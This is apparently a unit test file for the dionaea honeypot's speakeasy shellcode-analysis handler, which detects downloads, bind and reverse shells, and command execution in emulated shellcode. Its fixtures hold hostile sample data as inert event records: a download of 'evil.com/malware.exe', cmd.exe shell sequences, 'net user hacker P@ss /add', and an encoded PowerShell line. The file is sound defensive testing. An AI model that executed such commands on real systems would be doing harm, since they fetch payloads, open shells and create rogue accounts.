# ABOUTME: Unit tests for speakeasy shellcode analysis handler.
# ABOUTME: Tests pure helper functions and detection logic with mocked dionaea runtime.

import sys
import os
import json
from unittest.mock import MagicMock

# Add modules/python to path so we can import the real dionaea package
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "..", "..", "modules", "python"))

# Stub classes for dionaea runtime types (provided by Rust binary at runtime)
class _StubIHandler:
    def __init__(self, path):
        pass

class _StubConnection:
    pass

_mock_incident_class = MagicMock()

_core_module = MagicMock()
_core_module.ihandler = _StubIHandler
_core_module.incident = _mock_incident_class
_core_module.connection = _StubConnection
sys.modules["dionaea.core"] = _core_module
sys.modules["dionaea.cmd"] = MagicMock()

from dionaea.speakeasy import _api_matches, _parse_host_port, SpeakeasyShellcodeHandler


class TestApiMatches:
    """Tests for _api_matches helper."""

    def test_bare_name_match(self):
        assert _api_matches("connect", ["connect", "WSAConnect"])

    def test_module_prefixed_match(self):
        assert _api_matches("ws2_32.connect", ["connect", "WSAConnect"])

    def test_no_match(self):
        assert not _api_matches("recv", ["connect", "WSAConnect"])

    def test_module_prefixed_no_match(self):
        assert not _api_matches("ws2_32.recv", ["connect", "WSAConnect"])

    def test_empty_patterns(self):
        assert not _api_matches("connect", [])

    def test_empty_api_name(self):
        assert not _api_matches("", ["connect"])

    def test_multiple_dots_takes_last(self):
        assert _api_matches("foo.bar.connect", ["connect"])

    def test_exact_match_no_prefix(self):
        assert _api_matches("CreateProcessA", ["CreateProcessA", "CreateProcessW"])

    def test_urlmon_prefix(self):
        assert _api_matches("urlmon.URLDownloadToFileA", ["URLDownloadToFileA"])


class TestParseHostPort:
    """Tests for _parse_host_port helper."""

    def test_ipv4(self):
        host, port = _parse_host_port(["sock", "192.168.1.1:4444", "16"], 1)
        assert host == "192.168.1.1"
        assert port == 4444

    def test_ipv6(self):
        host, port = _parse_host_port(["sock", "[::1]:8080", "28"], 1)
        assert host == "::1"
        assert port == 8080

    def test_index_out_of_range(self):
        host, port = _parse_host_port(["sock"], 1)
        assert host is None
        assert port is None

    def test_no_colon(self):
        host, port = _parse_host_port(["sock", "192.168.1.1", "16"], 1)
        assert host is None
        assert port is None

    def test_invalid_port(self):
        host, port = _parse_host_port(["sock", "192.168.1.1:abc", "16"], 1)
        assert host is None
        assert port is None

    def test_index_zero(self):
        host, port = _parse_host_port(["0.0.0.0:1234"], 0)
        assert host == "0.0.0.0"
        assert port == 1234

    def test_ipv6_malformed_bracket(self):
        host, port = _parse_host_port(["sock", "[::1", "28"], 1)
        assert host is None
        assert port is None

    def test_ipv6_no_port_after_bracket(self):
        host, port = _parse_host_port(["sock", "[::1]", "28"], 1)
        assert host is None
        assert port is None

    def test_empty_args(self):
        host, port = _parse_host_port([], 0)
        assert host is None
        assert port is None


class TestDetectDownloads:
    """Tests for download detection from API events."""

    def setup_method(self):
        _mock_incident_class.reset_mock()
        self.handler = SpeakeasyShellcodeHandler.__new__(SpeakeasyShellcodeHandler)

    def test_urldownloadtofile_bare(self):
        events = [
            {"event": "api", "api_name": "URLDownloadToFileA", "args": ["0", "http://evil.com/malware.exe", "C:\\tmp\\a.exe", "0", "0"]},
        ]
        self.handler._detect_downloads(events, None)
        _mock_incident_class.assert_called_once_with("dionaea.download.offer")
        inc = _mock_incident_class.return_value
        inc.set.assert_any_call("url", "http://evil.com/malware.exe")
        inc.report.assert_called_once()

    def test_urldownloadtofile_prefixed(self):
        events = [
            {"event": "api", "api_name": "urlmon.URLDownloadToFileA", "args": ["0", "http://evil.com/bad.exe", "C:\\a.exe", "0", "0"]},
        ]
        self.handler._detect_downloads(events, None)
        _mock_incident_class.assert_called_once_with("dionaea.download.offer")

    def test_no_download_on_unrelated_api(self):
        events = [
            {"event": "api", "api_name": "ws2_32.connect", "args": ["1", "10.0.0.1:4444", "16"]},
        ]
        self.handler._detect_downloads(events, None)
        _mock_incident_class.assert_not_called()

    def test_too_few_args(self):
        events = [
            {"event": "api", "api_name": "URLDownloadToFileA", "args": ["0"]},
        ]
        self.handler._detect_downloads(events, None)
        _mock_incident_class.assert_not_called()

    def test_sets_connection(self):
        con = MagicMock()
        events = [
            {"event": "api", "api_name": "URLDownloadToFileA", "args": ["0", "http://x.com/a", "c", "0", "0"]},
        ]
        self.handler._detect_downloads(events, con)
        inc = _mock_incident_class.return_value
        inc.set.assert_any_call("con", con)


class TestDetectBindShell:
    """Tests for bind shell state machine detection."""

    def setup_method(self):
        _mock_incident_class.reset_mock()
        self.handler = SpeakeasyShellcodeHandler.__new__(SpeakeasyShellcodeHandler)

    def test_full_bind_shell_sequence(self):
        events = [
            {"event": "api", "api_name": "ws2_32.socket", "args": ["2", "1", "6"]},
            {"event": "api", "api_name": "ws2_32.bind", "args": ["1", "0.0.0.0:4444", "16"]},
            {"event": "api", "api_name": "ws2_32.listen", "args": ["1", "5"]},
            {"event": "api", "api_name": "ws2_32.accept", "args": ["1", "0", "0"]},
            {"event": "api", "api_name": "kernel32.CreateProcessA", "args": ["", "cmd.exe", "0", "0", "1", "0", "0", "0", "startup", "procinfo"]},
        ]
        self.handler._detect_bind_shell(events, None)
        _mock_incident_class.assert_called_once_with("dionaea.service.shell.listen")
        inc = _mock_incident_class.return_value
        inc.set.assert_any_call("port", 4444)
        inc.set.assert_any_call("host", "0.0.0.0")

    def test_incomplete_sequence_no_incident(self):
        events = [
            {"event": "api", "api_name": "ws2_32.socket", "args": ["2", "1", "6"]},
            {"event": "api", "api_name": "ws2_32.bind", "args": ["1", "0.0.0.0:4444", "16"]},
            {"event": "api", "api_name": "ws2_32.listen", "args": ["1", "5"]},
            # Missing accept + CreateProcess
        ]
        self.handler._detect_bind_shell(events, None)
        _mock_incident_class.assert_not_called()

    def test_out_of_order_no_incident(self):
        events = [
            {"event": "api", "api_name": "ws2_32.bind", "args": ["1", "0.0.0.0:4444", "16"]},
            {"event": "api", "api_name": "ws2_32.socket", "args": ["2", "1", "6"]},
            {"event": "api", "api_name": "ws2_32.listen", "args": ["1", "5"]},
            {"event": "api", "api_name": "ws2_32.accept", "args": ["1", "0", "0"]},
            {"event": "api", "api_name": "kernel32.CreateProcessA", "args": ["", "cmd.exe"]},
        ]
        self.handler._detect_bind_shell(events, None)
        _mock_incident_class.assert_not_called()


class TestDetectReverseShell:
    """Tests for reverse shell state machine detection."""

    def setup_method(self):
        _mock_incident_class.reset_mock()
        self.handler = SpeakeasyShellcodeHandler.__new__(SpeakeasyShellcodeHandler)

    def test_full_reverse_shell_sequence(self):
        events = [
            {"event": "api", "api_name": "ws2_32.socket", "args": ["2", "1", "6"]},
            {"event": "api", "api_name": "ws2_32.connect", "args": ["1", "10.0.0.1:4444", "16"]},
            {"event": "api", "api_name": "kernel32.CreateProcessA", "args": ["", "cmd.exe", "0", "0", "1", "0", "0", "0", "startup", "procinfo"]},
        ]
        self.handler._detect_reverse_shell(events, None)
        _mock_incident_class.assert_called_once_with("dionaea.service.shell.connect")
        inc = _mock_incident_class.return_value
        inc.set.assert_any_call("port", 4444)
        inc.set.assert_any_call("host", "10.0.0.1")

    def test_wsaconnect_variant(self):
        events = [
            {"event": "api", "api_name": "WSASocketW", "args": ["2", "1", "6", "0", "0", "0"]},
            {"event": "api", "api_name": "WSAConnect", "args": ["1", "192.168.1.100:9999", "16"]},
            {"event": "api", "api_name": "CreateProcessW", "args": ["", "cmd.exe"]},
        ]
        self.handler._detect_reverse_shell(events, None)
        _mock_incident_class.assert_called_once_with("dionaea.service.shell.connect")
        inc = _mock_incident_class.return_value
        inc.set.assert_any_call("host", "192.168.1.100")
        inc.set.assert_any_call("port", 9999)


class TestDetectCommandExecution:
    """Tests for command execution detection."""

    def setup_method(self):
        _mock_incident_class.reset_mock()
        sys.modules["dionaea.cmd"] = MagicMock()
        self.handler = SpeakeasyShellcodeHandler.__new__(SpeakeasyShellcodeHandler)

    def test_process_create_event_preferred(self):
        from dionaea.cmd import cmdexe
        cmdexe.reset_mock()

        api_events = [
            {"event": "api", "api_name": "kernel32.WinExec", "args": ["cmd.exe /c echo hello", "0"]},
        ]
        process_creates = [
            {"event": "process_create", "cmdline": "powershell.exe -enc ABC"},
        ]
        self.handler._detect_command_execution(api_events, process_creates, None)
        cmdexe.assert_called_once_with(None)
        cmdexe.return_value.handle_io_in.assert_called_once_with(b"powershell.exe -enc ABC\0")

    def test_winexec_fallback(self):
        from dionaea.cmd import cmdexe
        cmdexe.reset_mock()

        api_events = [
            {"event": "api", "api_name": "kernel32.WinExec", "args": ["cmd.exe /c calc", "0"]},
        ]
        self.handler._detect_command_execution(api_events, [], None)
        cmdexe.assert_called_once_with(None)
        cmdexe.return_value.handle_io_in.assert_called_once_with(b"cmd.exe /c calc\0")

    def test_createprocess_fallback(self):
        from dionaea.cmd import cmdexe
        cmdexe.reset_mock()

        api_events = [
            {"event": "api", "api_name": "kernel32.CreateProcessA", "args": ["", "net user hacker P@ss /add"]},
        ]
        self.handler._detect_command_execution(api_events, [], None)
        cmdexe.assert_called_once_with(None)
        cmdexe.return_value.handle_io_in.assert_called_once_with(b"net user hacker P@ss /add\0")

    def test_no_command_execution(self):
        from dionaea.cmd import cmdexe
        cmdexe.reset_mock()

        api_events = [
            {"event": "api", "api_name": "ws2_32.connect", "args": ["1", "10.0.0.1:80", "16"]},
        ]
        self.handler._detect_command_execution(api_events, [], None)
        cmdexe.assert_not_called()


class TestProcessNetworkEvents:
    """Tests for structured network event processing."""

    def setup_method(self):
        _mock_incident_class.reset_mock()
        self.handler = SpeakeasyShellcodeHandler.__new__(SpeakeasyShellcodeHandler)

    def test_connect_event(self):
        net_traffic = [
            {"type": "connect", "server": "10.0.0.1", "port": 4444, "proto": "tcp", "method": "winsock"},
        ]
        self.handler._process_network_events(net_traffic, [], None)
        _mock_incident_class.assert_called_once_with("dionaea.service.shell.connect")
        inc = _mock_incident_class.return_value
        inc.set.assert_any_call("host", "10.0.0.1")
        inc.set.assert_any_call("port", 4444)

    def test_bind_event(self):
        net_traffic = [
            {"type": "bind", "port": 8080, "proto": "tcp"},
        ]
        self.handler._process_network_events(net_traffic, [], None)
        _mock_incident_class.assert_called_once_with("dionaea.service.shell.listen")
        inc = _mock_incident_class.return_value
        inc.set.assert_any_call("port", 8080)

    def test_dns_event_logged_no_incident(self):
        net_dns = [
            {"query": "evil.com"},
        ]
        self.handler._process_network_events([], net_dns, None)
        _mock_incident_class.assert_not_called()

    def test_unknown_event_type_ignored(self):
        net_traffic = [
            {"type": "unknown", "server": "1.2.3.4", "port": 80},
        ]
        self.handler._process_network_events(net_traffic, [], None)
        _mock_incident_class.assert_not_called()


class TestProcessResults:
    """Tests for the top-level _process_results method."""

    def setup_method(self):
        _mock_incident_class.reset_mock()
        sys.modules["dionaea.cmd"] = MagicMock()
        self.handler = SpeakeasyShellcodeHandler.__new__(SpeakeasyShellcodeHandler)

    def test_emits_profile_incident(self):
        results = {
            "entry_points": [{
                "ep_type": "shellcode",
                "events": [
                    {"event": "api", "api_name": "ws2_32.recv", "args": ["1", "buf", "1024", "0"]},
                ],
            }],
        }
        self.handler._process_results(results, None)

        # Should emit emu.profile with all API events as JSON
        calls = _mock_incident_class.call_args_list
        profile_calls = [c for c in calls if c[0][0] == "dionaea.module.emu.profile"]
        assert len(profile_calls) == 1

        inc = _mock_incident_class.return_value
        # Verify profile was set as JSON
        set_calls = {c[0][0]: c[0][1] for c in inc.set.call_args_list}
        assert "profile" in set_calls
        profile_data = json.loads(set_calls["profile"])
        assert len(profile_data) == 1
        assert profile_data[0]["api_name"] == "ws2_32.recv"

    def test_no_entry_points(self):
        results = {"entry_points": []}
        self.handler._process_results(results, None)
        _mock_incident_class.assert_not_called()

    def test_empty_events(self):
        results = {
            "entry_points": [{"ep_type": "shellcode", "events": []}],
        }
        self.handler._process_results(results, None)
        _mock_incident_class.assert_not_called()
